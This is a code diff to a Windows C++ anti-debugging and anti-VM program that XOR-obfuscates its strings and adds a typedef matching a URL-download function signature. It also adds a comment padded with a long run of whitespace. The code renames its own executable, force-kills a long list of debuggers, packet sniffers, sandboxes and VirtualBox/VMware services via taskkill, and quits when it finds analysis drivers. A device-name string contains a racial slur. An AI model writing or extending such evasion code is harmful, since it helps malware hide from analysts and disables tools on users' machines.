@@ -3,6 +3,8 @@
 
 #include <windows.h>
 #include <iostream>
+#include <shlobj.h>
+#include <shellapi.h>
 
 // Define an array of alphanumeric characters for generating random strings
 static const char alphanum[] = "0123456789667" "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -15,7 +17,7 @@ void ObfuscatePEHeader()
     HMODULE hModule = GetModuleHandle(NULL);
     if (hModule == NULL) 
     {
-        std::cerr << "Failed to get module handle" << std::endl;
+        std::cerr << XorString("Failed to get module handle") << std::endl;
         return;
     }
     BYTE* pBaseAddr = (BYTE*)hModule;
@@ -23,21 +25,21 @@ void ObfuscatePEHeader()
     // Change the memory protection to be writable
     if (!VirtualProtect(pBaseAddr, 4096, PAGE_READWRITE, &oldProtect)) 
     {
-        std::cerr << "Failed to change memory protection" << std::endl;
+        std::cerr << XorString("Failed to change memory protection") << std::endl;
         return;
     }
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBaseAddr;
     // Check the DOS header signature
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
     {
-        std::cerr << "Invalid DOS header signature" << std::endl;
+        std::cerr << XorString("Invalid DOS header signature") << std::endl;
         return;
     }
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pBaseAddr + dosHeader->e_lfanew);
     // Check the NT header signature
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) 
     {
-        std::cerr << "Invalid NT header signature" << std::endl;
+        std::cerr << XorString("Invalid NT header signature") << std::endl;
         return;
     }
     // Obfuscate the PE header by XORing specific fields
@@ -46,11 +48,11 @@ void ObfuscatePEHeader()
     // Restore the original memory protection
     if (!VirtualProtect(pBaseAddr, 4096, oldProtect, &oldProtect)) 
     {
-        std::cerr << "Failed to restore memory protection" << std::endl;
+        std::cerr << XorString("Failed to restore memory protection") << std::endl;
         return;
     }
 
-    std::cout << "PE header obfuscated successfully." << std::endl;
+    std::cout << XorString("PE header obfuscated successfully.") << std::endl;
 }
 
 // Function to generate a random character from the alphanumeric array
@@ -64,15 +66,15 @@ void Randomexe()
 {
     srand(time(0));
     std::string Str;
-    std::string Dimen = ("LksAnti-");
-    std::string Wyp = ("DBG-");
+    std::string Dimen = XorString("LksAnti-");
+    std::string Wyp = XorString("DBG-");
     // Generate a random string of 5 characters
     for (unsigned int i = 0; i < 5; ++i)
     {
         Str += genRandomn();
     }
     // Create the new filename
-    std::string rename = Dimen + Wyp + Str + (".exe");
+    std::string rename = Dimen + Wyp + Str + (XorString(".exe"));
     char filename[MAX_PATH];
     DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
     // Rename the current executable
@@ -83,62 +85,51 @@ void Randomexe()
 // Function to kill various debugging and virtualization processes
 void killdbg() 
 {
-    const char* processes[] = 
+    const char* processes[] =
     {
-        // List of process names to terminate
-        "KsDumperClient.exe", "KsDumper.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe",
-        "ProcessHacker.exe", "idaq.exe", "idaq64.exe", "Wireshark.exe", "Fiddler.exe",
-        "FiddlerEverywhere.exe", "Xenos64.exe", "Xenos.exe", "Xenos32.exe", "de4dot.exe",
-        "Cheat Engine.exe", "HTTP Debugger Windows Service (32 bit).exe", "KsDumper.exe",
-        "OllyDbg.exe", "x64dbg.exe", "x32dbg.exe", "httpdebugger*", "Ida64.exe",
-        "Dbg64.exe", "Dbg32.exe", "cheatengine*", "processhacker*", "scylla.exe",
-        "scylla_x64.exe", "scylla_x86.exe", "protection_id.exe", "vmware.exe",
-        "vmware-tray.exe", "vmwareuser.exe", "vmwaretray.exe", "vmtoolsd.exe",
-        "vmsrvc.exe", "VBoxService.exe", "VBoxTray.exe", "ReClass.NET.exe",
-        "x32dbg.exe", "ImmunityDebugger.exe", "PETools.exe", "LordPE.exe",
-        "SysInspector.exe", "proc_analyzer.exe", "sysAnalyzer.exe", "sniff_hit.exe",
-        "windbg.exe", "joeboxcontrol.exe", "joeboxserver.exe", "ida.exe", "ida64.exe",
-        "idaq64.exe", "Vmtoolsd.exe", "Vmwaretrat.exe", "Vmwareuser.exe", "Vmacthlp.exe",
-        "vboxservice.exe", "vboxtray.exe", "ReClass.NET.exe", "OLLYDBG.exe",
-        "Cheat Engine.exe", "KsDumper.exe", "dnSpy.exe", "cheatengine-i386.exe",
-        "cheatengine-x86_64.exe", "Fiddler Everywhere.exe", "HTTPDebuggerSvc.exe",
-        "Fiddler.WebUi.exe", "createdump.exe", "VBoxTray.exe", "VBoxService.exe",
-        "VBoxClient.exe", "VBoxHeadless.exe", "VBoxSVC.exe", "VBoxNetDHCP.exe",
-        "VBoxNetNAT.exe", "VBoxNetAdpCtl.exe", "VBoxNetFltSvc.exe", "VBoxTestOGL.exe",
-        "VBoxTstDrv.exe", "VBoxCertUtil.exe", "VBoxDrvInst.exe", "VBoxUSBMon.exe",
-        "VBoxXPCOMIPCD.exe", "VBoxRT.dll", "VBoxDD.dll", "VBoxDDU.dll", "VBoxREM.dll",
-        "VBoxREM2.dll", "VBoxREM.dll", "VBoxVMM.dll", "VBoxSharedCrOpenGL.dll",
-        "VBoxWDDM.dll", "VBoxVRDP.dll", "VBoxGuestControlSvc.exe", "VBoxTray.exe",
-        "VBoxService.exe", "VBoxServiceXP.exe", "VBoxServiceNT.exe",
-        "VBoxSharedCrOpenGL.dll", "VBoxRT.dll", "VBoxVMM.dll", "VBoxVD.dll",
-        "VBoxREM.dll", "VBoxREM2.dll", "VBoxREM3.dll", "VBoxREM4.dll", "VBoxWDDM.dll",
-        "VBoxSharedFolderSvc.exe", "VBoxSharedFolderSvcXP.exe", "VBoxSharedFolderSvcNT.exe",
-        "createdump.exe", "protection_id.exe", "vmware.exe", "vmware-tray.exe",
-        "vmwareuser.exe", "vmwaretray.exe", "vmtoolsd.exe", "vmwaretray.exe",
-        "vmwareuser.exe", "vmsrvc.exe", "ida64.exe", "scylla.exe", "scylla_x64.exe",
-        "scylla_x86.exe", "protection_id.exe", "vmware.exe", "vmware-tray.exe",
-        "vmwareuser.exe", "vmwaretray.exe", "vmtoolsd.exe", "vmwaretray.exe",
-        "vmwareuser.exe", "vmsrvc.exe"
+        XorString("KsDumperClient.exe"), XorString("KsDumper.exe"), XorString("HTTPDebuggerUI.exe"), XorString("HTTPDebuggerSvc.exe"),
+        XorString("ProcessHacker.exe"), XorString("idaq.exe"), XorString("idaq64.exe"), XorString("Wireshark.exe"), XorString("Fiddler.exe"),
+        XorString("FiddlerEverywhere.exe"), XorString("Xenos64.exe"), XorString("Xenos.exe"), XorString("Xenos32.exe"), XorString("de4dot.exe"),
+        XorString("Cheat Engine.exe"), XorString("HTTP Debugger Windows Service (32 bit).exe"), XorString("OllyDbg.exe"), XorString("x64dbg.exe"),
+        XorString("x32dbg.exe"), XorString("httpdebugger*"), XorString("Ida64.exe"), XorString("Dbg64.exe"), XorString("Dbg32.exe"),
+        XorString("cheatengine*"), XorString("processhacker*"), XorString("scylla.exe"), XorString("scylla_x64.exe"), XorString("scylla_x86.exe"),
+        XorString("protection_id.exe"), XorString("vmware.exe"), XorString("vmware-tray.exe"), XorString("vmwareuser.exe"),
+        XorString("vmwaretray.exe"), XorString("vmtoolsd.exe"), XorString("vmsrvc.exe"), XorString("VBoxService.exe"), XorString("VBoxTray.exe"),
+        XorString("ReClass.NET.exe"), XorString("ImmunityDebugger.exe"), XorString("PETools.exe"), XorString("LordPE.exe"),
+        XorString("SysInspector.exe"), XorString("proc_analyzer.exe"), XorString("sysAnalyzer.exe"), XorString("sniff_hit.exe"),
+        XorString("windbg.exe"), XorString("joeboxcontrol.exe"), XorString("joeboxserver.exe"), XorString("ida.exe"), XorString("ida64.exe"),
+        XorString("idaq64.exe"), XorString("Vmtoolsd.exe"), XorString("Vmwaretrat.exe"), XorString("Vmwareuser.exe"), XorString("Vmacthlp.exe"),
+        XorString("vboxservice.exe"), XorString("vboxtray.exe"), XorString("OLLYDBG.exe"), XorString("dnSpy.exe"),
+        XorString("cheatengine-i386.exe"), XorString("cheatengine-x86_64.exe"), XorString("Fiddler Everywhere.exe"),
+        XorString("Fiddler.WebUi.exe"), XorString("createdump.exe"), XorString("VBoxClient.exe"), XorString("VBoxHeadless.exe"),
+        XorString("VBoxSVC.exe"), XorString("VBoxNetDHCP.exe"), XorString("VBoxNetNAT.exe"), XorString("VBoxNetAdpCtl.exe"),
+        XorString("VBoxNetFltSvc.exe"), XorString("VBoxTestOGL.exe"), XorString("VBoxTstDrv.exe"), XorString("VBoxCertUtil.exe"),
+        XorString("VBoxDrvInst.exe"), XorString("VBoxUSBMon.exe"), XorString("VBoxXPCOMIPCD.exe"), XorString("VBoxRT.dll"),
+        XorString("VBoxDD.dll"), XorString("VBoxDDU.dll"), XorString("VBoxREM.dll"), XorString("VBoxREM2.dll"), XorString("VBoxVMM.dll"),
+        XorString("VBoxSharedCrOpenGL.dll"), XorString("VBoxWDDM.dll"), XorString("VBoxVRDP.dll"), XorString("VBoxGuestControlSvc.exe"),
+        XorString("VBoxServiceXP.exe"), XorString("VBoxServiceNT.exe"), XorString("VBoxVD.dll"), XorString("VBoxREM3.dll"),
+        XorString("VBoxREM4.dll"), XorString("VBoxSharedFolderSvc.exe"), XorString("VBoxSharedFolderSvcXP.exe"),
+        XorString("VBoxSharedFolderSvcNT.exe")
     };
     // Iterate through the process list and terminate each one
     for (const char* process : processes) 
     {
-        std::string command = "taskkill /f /im " + std::string(process) + " >nul 2>&1";
+        std::string command = XorString("taskkill /f /im ") + std::string(process) + XorString(" >nul 2>&1");
         system(command.c_str());
     }
     // Additional specific kill commands
-    system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq de4dot*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq vmware*\" /IM * /F /T >nul 2>&1");
-    system("taskkill /FI \"IMAGENAME eq vbox*\" /IM * /F /T >nul 2>&1");
+    system(XorString("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq ollydbg*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq x64dbg*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq x32dbg*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq de4dot*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq vmware*\" /IM * /F /T >nul 2>&1"));
+    system(XorString("taskkill /FI \"IMAGENAME eq vbox*\" /IM * /F /T >nul 2>&1"));
 }
 
 // Function to check if a debugger is present and terminate the process if it is
@@ -164,10 +155,10 @@ BOOL CheckPEB()
 // Function to detect if the IsDebuggerPresent function has been patched
 void IsDebuggerPresentPatched()
 {
-    HMODULE hKernel32 = GetModuleHandleA(("kernel32.dll"));
+    HMODULE hKernel32 = GetModuleHandleA((XorString("kernel32.dll")));
     if (!hKernel32) {}
 
-    FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, ("IsDebuggerPresent"));
+    FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, (XorString("IsDebuggerPresent")));
     if (!pIsDebuggerPresent) {}
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -225,10 +216,10 @@ void IsDebuggerPresentPatched()
 // Function to prevent the process from being attached by a debugger
 void AntiAttach()
 {
-    HMODULE hNtdll = GetModuleHandleA(("ntdll.dll"));
+    HMODULE hNtdll = GetModuleHandleA((XorString("ntdll.dll")));
     if (!hNtdll)
         return;
-    FARPROC pDbgBreakPoint = GetProcAddress(hNtdll, ("DbgBreakPoint"));
+    FARPROC pDbgBreakPoint = GetProcAddress(hNtdll, (XorString("DbgBreakPoint")));
     if (!pDbgBreakPoint)
         return;
     DWORD dwOldProtect;
@@ -239,56 +230,61 @@ void AntiAttach()
 
 // Function to stop the debugger using NtSetInformationThread
 typedef NTSTATUS(CALLBACK* NtSetInformationThreadPtr)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
+typedef HRESULT(WINAPI* pDL)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
 void StopDebegger()
 {
-    HMODULE hModule = LoadLibrary(TEXT("ntdll.dll"));
-    NtSetInformationThreadPtr NtSetInformationThread = (NtSetInformationThreadPtr)GetProcAddress(hModule, ("NtSetInformationThread"));
+    HMODULE hModule = LoadLibraryA(XorString("ntdll.dll"));
+    NtSetInformationThreadPtr NtSetInformationThread = (NtSetInformationThreadPtr)GetProcAddress(hModule, (XorString("NtSetInformationThread")));
 
     NtSetInformationThread(OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId()), (THREADINFOCLASS)0x11, 0, 0);
 }
 
 // List of blacklisted process names and file names to check
-const wchar_t* ProcessBlacklist[] = 
+const wchar_t* ProcessBlacklist[] =
 {
-    L"WinDbgFrameClass", L"OLLYDBG", L"IDA", L"IDA64", L"ida64.exe", L"ida.exe",
-    L"idaq64.exe", L"KsDumper", L"x64dbg", L"The Wireshark Network Analyzer",
-    L"Progress Telerik Fiddler Web Debugger", L"dnSpy", L"IDA v7.0.170914",
-    L"ImmunityDebugger", L"OLLYDBG", L"Cheat Engine", L"OLLYDBG.EXE",
-    L"Process Hacker", L"ProcessHacker", L"ProcessHacker.exe", L"procmon.exe",
-    L"filemon.exe", L"regmon.exe", L"procexp.exe", L"tcpview.exe",
-    L"autoruns.exe", L"autorunsc.exe", L"procexp.exe", L"procexp64.exe",
-    L"Wireshark.exe", L"dumpcap.exe", L"HookExplorer.exe", L"ImportREC.exe",
-    L"PETools.exe", L"LordPE.exe", L"SysInspector.exe", L"proc_analyzer.exe",
-    L"sysAnalyzer.exe", L"sniff_hit.exe", L"windbg.exe", L"joeboxcontrol.exe",
-    L"joeboxserver.exe", L"Fiddler.exe", L"ida64.exe", L"idaq64.exe",
-    L"Vmtoolsd.exe", L"Vmwaretrat.exe", L"Vmwareuser.exe", L"Vmacthlp.exe",
-    L"vboxservice.exe", L"vboxtray.exe", L"ReClass.NET.exe", L"x64dbg.exe",
-    L"OLLYDBG.exe", L"Cheat Engine.exe", L"KsDumper.exe", L"dnSpy.exe",
-    L"cheatengine-i386.exe", L"cheatengine-x86_64.exe", L"Fiddler Everywhere.exe",
-    L"HTTPDebuggerSvc.exe", L"Fiddler.WebUi.exe", L"createdump.exe",
-    L"VBoxTray.exe", L"VBoxService.exe", L"VBoxClient.exe", L"VBoxHeadless.exe",
-    L"VBoxSVC.exe", L"VBoxNetDHCP.exe", L"VBoxNetNAT.exe", L"VBoxNetAdpCtl.exe",
-    L"VBoxNetFltSvc.exe", L"VBoxTestOGL.exe", L"VBoxTstDrv.exe", L"VBoxCertUtil.exe",
-    L"VBoxDrvInst.exe", L"VBoxUSBMon.exe", L"VBoxXPCOMIPCD.exe", L"VBoxRT.dll",
-    L"VBoxDD.dll", L"VBoxDDU.dll", L"VBoxREM.dll", L"VBoxREM2.dll",
-    L"VBoxREM.dll", L"VBoxVMM.dll", L"VBoxSharedCrOpenGL.dll", L"VBoxWDDM.dll",
-    L"VBoxVRDP.dll", L"VBoxGuestControlSvc.exe", L"VBoxTray.exe",
-    L"VBoxService.exe", L"VBoxServiceXP.exe", L"VBoxServiceNT.exe",
-    L"VBoxSharedCrOpenGL.dll", L"VBoxRT.dll", L"VBoxVMM.dll", L"VBoxVD.dll",
-    L"VBoxREM.dll", L"VBoxREM2.dll", L"VBoxREM3.dll", L"VBoxREM4.dll",
-    L"VBoxWDDM.dll", L"VBoxSharedFolderSvc.exe", L"VBoxSharedFolderSvcXP.exe",
-    L"VBoxSharedFolderSvcNT.exe", L"createdump.exe", L"protection_id.exe",
-    L"vmware.exe", L"vmware-tray.exe", L"vmwareuser.exe", L"vmwaretray.exe",
-    L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe", L"vmsrvc.exe"
+    XorWideString(L"WinDbgFrameClass"), XorWideString(L"OLLYDBG"), XorWideString(L"IDA"), XorWideString(L"IDA64"), XorWideString(L"ida64.exe"),
+    XorWideString(L"ida.exe"), XorWideString(L"idaq64.exe"), XorWideString(L"KsDumper"), XorWideString(L"x64dbg"),
+    XorWideString(L"The Wireshark Network Analyzer"), XorWideString(L"Progress Telerik Fiddler Web Debugger"), XorWideString(L"dnSpy"),
+    XorWideString(L"IDA v7.0.170914"), XorWideString(L"ImmunityDebugger"), XorWideString(L"OLLYDBG"), XorWideString(L"Cheat Engine"),
+    XorWideString(L"OLLYDBG.EXE"), XorWideString(L"Process Hacker"), XorWideString(L"ProcessHacker"), XorWideString(L"ProcessHacker.exe"),
+    XorWideString(L"procmon.exe"), XorWideString(L"filemon.exe"), XorWideString(L"regmon.exe"), XorWideString(L"procexp.exe"),
+    XorWideString(L"tcpview.exe"), XorWideString(L"autoruns.exe"), XorWideString(L"autorunsc.exe"), XorWideString(L"procexp.exe"),
+    XorWideString(L"procexp64.exe"), XorWideString(L"Wireshark.exe"), XorWideString(L"dumpcap.exe"), XorWideString(L"HookExplorer.exe"),
+    XorWideString(L"ImportREC.exe"), XorWideString(L"PETools.exe"), XorWideString(L"LordPE.exe"), XorWideString(L"SysInspector.exe"),
+    XorWideString(L"proc_analyzer.exe"), XorWideString(L"sysAnalyzer.exe"), XorWideString(L"sniff_hit.exe"), XorWideString(L"windbg.exe"),
+    XorWideString(L"joeboxcontrol.exe"), XorWideString(L"joeboxserver.exe"), XorWideString(L"Fiddler.exe"), XorWideString(L"ida64.exe"),
+    XorWideString(L"idaq64.exe"), XorWideString(L"Vmtoolsd.exe"), XorWideString(L"Vmwaretrat.exe"), XorWideString(L"Vmwareuser.exe"),
+    XorWideString(L"Vmacthlp.exe"), XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"), XorWideString(L"ReClass.NET.exe"),
+    XorWideString(L"x64dbg.exe"), XorWideString(L"OLLYDBG.exe"), XorWideString(L"Cheat Engine.exe"), XorWideString(L"KsDumper.exe"),
+    XorWideString(L"dnSpy.exe"), XorWideString(L"cheatengine-i386.exe"), XorWideString(L"cheatengine-x86_64.exe"),
+    XorWideString(L"Fiddler Everywhere.exe"), XorWideString(L"HTTPDebuggerSvc.exe"), XorWideString(L"Fiddler.WebUi.exe"),
+    XorWideString(L"createdump.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"), XorWideString(L"VBoxClient.exe"),
+    XorWideString(L"VBoxHeadless.exe"), XorWideString(L"VBoxSVC.exe"), XorWideString(L"VBoxNetDHCP.exe"), XorWideString(L"VBoxNetNAT.exe"),
+    XorWideString(L"VBoxNetAdpCtl.exe"), XorWideString(L"VBoxNetFltSvc.exe"), XorWideString(L"VBoxTestOGL.exe"),
+    XorWideString(L"VBoxTstDrv.exe"), XorWideString(L"VBoxCertUtil.exe"), XorWideString(L"VBoxDrvInst.exe"), XorWideString(L"VBoxUSBMon.exe"),
+    XorWideString(L"VBoxXPCOMIPCD.exe"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxDD.dll"), XorWideString(L"VBoxDDU.dll"),
+    XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxVMM.dll"),
+    XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxWDDM.dll"), XorWideString(L"VBoxVRDP.dll"),
+    XorWideString(L"VBoxGuestControlSvc.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"),
+    XorWideString(L"VBoxServiceXP.exe"), XorWideString(L"VBoxServiceNT.exe"), XorWideString(L"VBoxSharedCrOpenGL.dll"),
+    XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxVMM.dll"), XorWideString(L"VBoxVD.dll"), XorWideString(L"VBoxREM.dll"),
+    XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxREM3.dll"), XorWideString(L"VBoxREM4.dll"), XorWideString(L"VBoxWDDM.dll"),
+    XorWideString(L"VBoxSharedFolderSvc.exe"), XorWideString(L"VBoxSharedFolderSvcXP.exe"),
+    XorWideString(L"VBoxSharedFolderSvcNT.exe"), XorWideString(L"createdump.exe"), XorWideString(L"protection_id.exe"),
+    XorWideString(L"vmware.exe"), XorWideString(L"vmware-tray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmwaretray.exe"),
+    XorWideString(L"vmtoolsd.exe"), XorWideString(L"vmwaretray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmsrvc.exe")
 };
-const wchar_t* FileBlacklist[] = 
+
+const wchar_t* FileBlacklist[] =
 {
-    L"CEHYPERSCANSETTINGS", L"IDA_PRO", L"IDALOG", L"IMMDBG_LOG", L"IMMUNITYDBG",
-    L"KS_DUMP", L"PROCMON_LOG", L"REGMON_LOG", L"PROCEXP_LOG", L"WINDBG_LOG",
-    L"TCPVIEW_LOG", L"AUTORUNS_LOG", L"FIDD_LOG", L"HTTPDEBUG_LOG", L"WINVBOX_LOG",
-    L"VBOXLOG", L"VBOXDRIVERS", L"VMWARE_LOG", L"VMTOOLS_LOG", L"VMDRIVERS_LOG",
-    L"MS_DIRECTIO", L"WINIO_LOG", L"PROT_ID_LOG", L"RKPAVPROC1_LOG"
+    XorWideString(L"CEHYPERSCANSETTINGS"), XorWideString(L"IDA_PRO"), XorWideString(L"IDALOG"), XorWideString(L"IMMDBG_LOG"),
+    XorWideString(L"IMMUNITYDBG"), XorWideString(L"KS_DUMP"), XorWideString(L"PROCMON_LOG"), XorWideString(L"REGMON_LOG"),
+    XorWideString(L"PROCEXP_LOG"), XorWideString(L"WINDBG_LOG"), XorWideString(L"TCPVIEW_LOG"), XorWideString(L"AUTORUNS_LOG"),
+    XorWideString(L"FIDD_LOG"), XorWideString(L"HTTPDEBUG_LOG"), XorWideString(L"WINVBOX_LOG"), XorWideString(L"VBOXLOG"),
+    XorWideString(L"VBOXDRIVERS"), XorWideString(L"VMWARE_LOG"), XorWideString(L"VMTOOLS_LOG"), XorWideString(L"VMDRIVERS_LOG"),
+    XorWideString(L"MS_DIRECTIO"), XorWideString(L"WINIO_LOG"), XorWideString(L"PROT_ID_LOG"), XorWideString(L"RKPAVPROC1_LOG")
 };
+
 
 // Function to scan for blacklisted processes and files
 void ScanBlacklist() 
@@ -326,33 +322,33 @@ void driverdetect()
 {
     const TCHAR* devices[] = 
     {
-        L"\\\\.\\kdstinker",
-        L"\\\\.\\NiGgEr",
-        L"\\\\.\\KsDumper",
-        L"\\\\.\\EXTREM",
-        L"\\\\.\\ICEEXT",
-        L"\\\\.\\NDBGMSG.VXD",
-        L"\\\\.\\RING0",
-        L"\\\\.\\SIWVID",
-        L"\\\\.\\SYSER",
-        L"\\\\.\\TRW",
-        L"\\\\.\\SYSERBOOT",
-        L"\\\\.\\VBoxMiniRdrDN",
-        L"\\\\.\\VBoxGuest",
-        L"\\\\.\\VBoxSF",
-        L"\\\\.\\VBoxNetAdp",
-        L"\\\\.\\VBoxNetFlt",
-        L"\\\\.\\vmci",
-        L"\\\\.\\vmmemctl",
-        L"\\\\.\\vsepflt",
-        L"\\\\.\\vmhgfs",
-        L"\\\\.\\vmvss",
-        L"\\\\.\\vsepflt",
-        L"\\\\.\\vmx86",
-        L"\\\\.\\MSDirectIO",
-        L"\\\\.\\winio",
-        L"\\\\.\\ProcExp152",
-        L"\\\\.\\RkPavproc1"
+        XorWideString(L"\\\\.\\kdstinker"),
+        XorWideString(L"\\\\.\\NiGgEr"),
+        XorWideString(L"\\\\.\\KsDumper"),
+        XorWideString(L"\\\\.\\EXTREM"),
+        XorWideString(L"\\\\.\\ICEEXT"),
+        XorWideString(L"\\\\.\\NDBGMSG.VXD"),
+        XorWideString(L"\\\\.\\RING0"),
+        XorWideString(L"\\\\.\\SIWVID"),
+        XorWideString(L"\\\\.\\SYSER"),
+        XorWideString(L"\\\\.\\TRW"),
+        XorWideString(L"\\\\.\\SYSERBOOT"),
+        XorWideString(L"\\\\.\\VBoxMiniRdrDN"),
+        XorWideString(L"\\\\.\\VBoxGuest"),
+        XorWideString(L"\\\\.\\VBoxSF"),
+        XorWideString(L"\\\\.\\VBoxNetAdp"),
+        XorWideString(L"\\\\.\\VBoxNetFlt"),
+        XorWideString(L"\\\\.\\vmci"),
+        XorWideString(L"\\\\.\\vmmemctl"),
+        XorWideString(L"\\\\.\\vsepflt"),
+        XorWideString(L"\\\\.\\vmhgfs"),
+        XorWideString(L"\\\\.\\vmvss"),
+        XorWideString(L"\\\\.\\vsepflt"),
+        XorWideString(L"\\\\.\\vmx86"),
+        XorWideString(L"\\\\.\\MSDirectIO"),
+        XorWideString(L"\\\\.\\winio"),
+        XorWideString(L"\\\\.\\ProcExp152"),
+        XorWideString(L"\\\\.\\RkPavproc1")
     };
     WORD iLength = sizeof(devices) / sizeof(devices[0]);
     for (int i = 0; i < iLength; i++) 
@@ -361,32 +357,32 @@ void driverdetect()
         if (hFile != INVALID_HANDLE_VALUE) 
         {
             CloseHandle(hFile);
-            std::wstring msg = L"start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO Blacklisted driver detected: ";
+            std::wstring msg = XorWideString(L"start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO Blacklisted driver detected: ");
             msg += devices[i];
-            msg += L" && TIMEOUT 10 >nul\"";
+            msg += XorWideString(L" && TIMEOUT 10 >nul\"");
             _wsystem(msg.c_str());
             exit(0);
         }
     }
 }
 
-// Function to check for debugging-related devices
+// Function to check for debugging-related devices                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    lol
 void CheckDevices() 
 {
     const char* DebuggingDrivers[] = 
     {
-        "\\\\.\\EXTREM", "\\\\.\\ICEEXT",
-        "\\\\.\\NDBGMSG.VXD", "\\\\.\\RING0",
-        "\\\\.\\SIWVID", "\\\\.\\SYSER",
-        "\\\\.\\TRW", "\\\\.\\SYSERBOOT",
-        "\\\\.\\VBoxMiniRdrDN", "\\\\.\\VBoxGuest",
-        "\\\\.\\VBoxSF", "\\\\.\\VBoxNetAdp",
-        "\\\\.\\VBoxNetFlt", "\\\\.\\vmci",
-        "\\\\.\\vmmemctl", "\\\\.\\vsepflt",
-        "\\\\.\\vmhgfs", "\\\\.\\vmvss",
-        "\\\\.\\vsepflt", "\\\\.\\vmx86",
-        "\\\\.\\MSDirectIO", "\\\\.\\winio",
-        "\\\\.\\ProcExp152", "\\\\.\\RkPavproc1"
+        XorString("\\\\.\\EXTREM"), XorString("\\\\.\\ICEEXT"),
+        XorString("\\\\.\\NDBGMSG.VXD"), XorString("\\\\.\\RING0"),
+        XorString("\\\\.\\SIWVID"), XorString("\\\\.\\SYSER"),
+        XorString("\\\\.\\TRW"), XorString("\\\\.\\SYSERBOOT"),
+        XorString("\\\\.\\VBoxMiniRdrDN"), XorString("\\\\.\\VBoxGuest"),
+        XorString("\\\\.\\VBoxSF"), XorString("\\\\.\\VBoxNetAdp"),
+        XorString("\\\\.\\VBoxNetFlt"), XorString("\\\\.\\vmci"),
+        XorString("\\\\.\\vmmemctl"), XorString("\\\\.\\vsepflt"),
+        XorString("\\\\.\\vmhgfs"), XorString("\\\\.\\vmvss"),
+        XorString("\\\\.\\vsepflt"), XorString("\\\\.\\vmx86"),
+        XorString("\\\\.\\MSDirectIO"), XorString("\\\\.\\winio"),
+        XorString("\\\\.\\ProcExp152"), XorString("\\\\.\\RkPavproc1")
     };
